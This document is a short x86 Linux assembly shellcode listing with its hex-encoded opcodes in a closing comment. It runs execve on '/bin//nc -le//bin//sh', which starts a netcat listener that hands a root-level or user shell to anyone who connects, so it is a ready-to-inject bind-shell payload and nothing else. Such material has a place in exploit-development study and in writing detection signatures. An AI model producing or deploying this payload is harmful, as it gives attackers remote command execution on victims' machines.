section .text
global _start
 _start:

  xor edx, edx
  push edx
  push 0x68732f2f ; -le//bin//sh
  push 0x6e69622f
  push 0x2f656c2d
  mov edi, esp

  push edx
  push 0x636e2f2f ; /bin//nc
  push 0x6e69622f
  mov ebx, esp

  push edx
  push edi
  push ebx
  mov ecx, esp
  xor eax, eax
  mov al,11
  int 0x80

; 31d252682f2f7368682f62696e682d6c652f89e752682f2f6e63682f62696e89e352575389e131c0b00bcd80